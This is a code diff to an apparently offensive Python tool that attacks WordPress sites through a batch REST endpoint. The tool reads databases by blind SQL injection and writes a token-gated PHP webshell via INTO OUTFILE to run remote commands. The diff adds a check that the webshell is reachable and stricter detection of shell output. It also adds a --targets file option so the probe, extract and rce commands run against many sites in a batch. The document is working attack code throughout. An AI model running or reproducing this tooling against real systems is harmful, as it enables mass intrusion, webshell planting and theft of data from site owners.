@@ -470,10 +470,13 @@ _SHELL_MARKER = "WP2SHELL_OUTFILE"
 
 
 def rce_outfile(client: BatchClient, outfile_dir: str = "/var/lib/mysql-files",
-                web_dir: str = "/rce") -> Optional[Tuple[str, str, str]]:
+                web_dir: str = "/rce") -> Optional[Tuple[str, str, str, bool]]:
     """Write token-gated PHP webshell via UNION SELECT INTO OUTFILE.
 
-    Returns (web_path, token, filename) or None.
+    Returns (web_path, token, filename, reachable) or None.
+    reachable=False means file was written (INTO OUTFILE succeeded) but the
+    webserver returned 404/connection-error — common when DB + web are
+    separate containers (Docker) and OUTFILE writes to the DB filesystem.
     Requires MySQL FILE privilege and web_dir served by the webserver.
     """
     token = secrets.token_hex(16)
@@ -494,7 +497,12 @@ def rce_outfile(client: BatchClient, outfile_dir: str = "/var/lib/mysql-files",
     )
     resp = client.inject(sqli)
     if resp.status == 207:
-        return web_path, token, fname
+        # Verify the webshell is actually reachable from the web server.
+        # INTO OUTFILE writes to the DB server's filesystem — in Docker or
+        # split-horizon setups the DB container != web container.
+        if rce_run(client, web_path, token, "echo 1") is not None:
+            return web_path, token, fname, True
+        return web_path, token, fname, False
     return None
 
 
@@ -504,7 +512,9 @@ def rce_run(client: BatchClient, shell_path: str, token: str,
     qs = urllib.parse.urlencode({"t": token, "c": command})
     try:
         resp = client.get(f"{shell_path}?{qs}", timeout=timeout)
-        if resp.status < 500:
+        # Only 2xx means the webshell actually executed — 404/403 are
+        # Apache/nginx error pages, not shell output.
+        if 200 <= resp.status < 300:
             return resp.body.strip()
     except Exception:
         pass
@@ -1134,8 +1144,14 @@ def cmd_rce(args: argparse.Namespace) -> int:
         if not result:
             bad("INTO OUTFILE failed — no FILE priv or secure_file_priv set")
             return 1
-        web_path, token, fname = result
+        web_path, token, fname, reachable = result
         good(f"Webshell: {args.url.rstrip('/')}{web_path}")
+        if not reachable:
+            warn("Webshell NOT reachable — likely DB + web are separate containers")
+            info("File written to DB server filesystem, not the web root. "
+                 "Try --outfile-dir pointing to a web-accessible path on the DB host, "
+                 "or use --plugin mode with valid credentials.")
+            return 1
         if args.cmd:
             info(f"Running: {args.cmd}")
             out = rce_run(client, web_path, token, args.cmd)
@@ -1249,7 +1265,8 @@ def build_parser() -> argparse.ArgumentParser:
 
     # probe — admin endpoint mapping + secret extraction
     prb = sub.add_parser("probe", help="map admin endpoints via route confusion")
-    prb.add_argument("url", help="target base URL")
+    prb.add_argument("url", nargs="?", help="target base URL")
+    prb.add_argument("--targets", "-t", help="file with target URLs, one per line")
     prb.add_argument("--rest-route", action="store_true")
     prb.add_argument("--timeout", type=float, default=30.0)
     prb.add_argument("--proxy", help="HTTP proxy")
@@ -1259,7 +1276,8 @@ def build_parser() -> argparse.ArgumentParser:
 
     # check
     chk = sub.add_parser("check", help="non-destructive vulnerability detection")
-    chk.add_argument("url", help="target base URL")
+    chk.add_argument("url", nargs="?", help="target base URL")
+    chk.add_argument("--targets", "-t", help="file with target URLs, one per line")
     chk.add_argument("--rest-route", action="store_true",
                      help="use ?rest_route=/batch/v1")
     chk.add_argument("--timeout", type=float, default=30.0)
@@ -1275,7 +1293,8 @@ def build_parser() -> argparse.ArgumentParser:
 
     # extract
     ext = sub.add_parser("extract", help="read database via blind SQLi")
-    ext.add_argument("url", help="target base URL")
+    ext.add_argument("url", nargs="?", help="target base URL")
+    ext.add_argument("--targets", "-t", help="file with target URLs, one per line")
     ext.add_argument("--rest-route", action="store_true")
     ext.add_argument("--timeout", type=float, default=30.0)
     ext.add_argument("--proxy", help="HTTP proxy")
@@ -1291,7 +1310,8 @@ def build_parser() -> argparse.ArgumentParser:
 
     # rce
     rce = sub.add_parser("rce", help="remote code execution")
-    rce.add_argument("url", help="target base URL")
+    rce.add_argument("url", nargs="?", help="target base URL")
+    rce.add_argument("--targets", "-t", help="file with target URLs, one per line")
     rce.add_argument("--rest-route", action="store_true")
     rce.add_argument("--timeout", type=float, default=30.0)
     rce.add_argument("--proxy", help="HTTP proxy")
@@ -1316,16 +1336,55 @@ def build_parser() -> argparse.ArgumentParser:
     return p
 
 
+def _read_targets(path: str) -> List[str]:
+    """Read target URLs from file, one per line, skip blanks and comments."""
+    targets = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith("#"):
+                targets.append(line)
+    return targets
+
+
+def _run_with_targets(args: argparse.Namespace) -> int:
+    """Run command against each target from --targets file or single URL."""
+    if args.targets:
+        targets = _read_targets(args.targets)
+        if not targets:
+            bad(f"no targets found in {args.targets}")
+            return 1
+        info(f"loaded {len(targets)} target(s) from {args.targets}")
+        results = []
+        for i, url in enumerate(targets, 1):
+            info(f"[{i}/{len(targets)}] {url}")
+            args.url = url
+            try:
+                results.append(args.func(args))
+            except (KeyboardInterrupt, SystemExit):
+                raise
+            except Exception as e:
+                warn(f"  failed: {e}")
+                results.append(1)
+        failures = sum(1 for r in results if r != 0)
+        if failures:
+            warn(f"{failures}/{len(results)} target(s) returned non-zero")
+        return 0 if failures == 0 else 1
+    else:
+        if not args.url:
+            bad("specify URL or --targets FILE")
+            return 1
+        return args.func(args)
+
+
 def main(argv: Optional[list] = None) -> int:
     parser = build_parser()
     args = parser.parse_args(argv)
     if not hasattr(args, "func"):
-        # Default: run auto chain (check) if no subcommand given
-        # If url is the only arg, redirect to check
         parser.print_help()
         return 1
     try:
-        return args.func(args)
+        return _run_with_targets(args)
     except KeyboardInterrupt:
         sys.stderr.write("\nInterrupted\n")
         return 130
